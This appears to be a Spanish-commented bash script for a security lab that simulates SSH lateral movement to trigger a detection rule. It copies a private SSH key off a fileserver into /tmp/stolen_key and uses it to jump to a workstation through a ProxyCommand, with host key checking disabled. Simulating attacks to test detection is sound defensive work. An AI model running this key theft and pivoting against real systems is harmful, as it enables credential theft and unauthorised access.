#!/bin/bash
# E3 - Movimiento lateral via SSH
# El atacante compromete fileserver y desde ahi salta a workstation

set -uo pipefail
LOG=/var/log/lab/runner.jsonl
mkdir -p "$(dirname $LOG)"

log_event() {
    ts=$(date -u +%s%N)
    echo "{\"ts\":$ts,\"scenario\":\"E3\",\"event\":\"$1\"$([ -n "${2:-}" ] && echo ",\"data\":\"$2\"")}" | tee -a "$LOG"
}

log_event "start"

# Paso 1: SSH al fileserver (primer compromiso)
log_event "step1_ssh_fileserver"
ssh -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no \
    lab@fileserver "echo 'first_hop'; hostname" >> "$LOG" 2>&1

# Paso 2: desde el fileserver, exfiltrar la clave SSH
log_event "step2_steal_key"
ssh -i /etc/ssh-keys/lab_runner_key -o StrictHostKeyChecking=no \
    lab@fileserver \
    "cat ~/.ssh/id_ed25519 2>/dev/null || cat ~/.ssh/id_rsa 2>/dev/null" \
    > /tmp/stolen_key 2>>"$LOG"
chmod 600 /tmp/stolen_key

# Paso 3: usar la clave para saltar a workstation (dispara regla 100220)
log_event "step3_lateral_jump"
ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no \
    -o ProxyCommand="ssh -i /tmp/stolen_key -o StrictHostKeyChecking=no -W %h:%p lab@fileserver" \
    lab@workstation \
    "hostname; whoami; echo 'lateral_success'" \
    >> "$LOG" 2>&1
RC=$?

log_event "end" "exit=$RC"
exit $RC
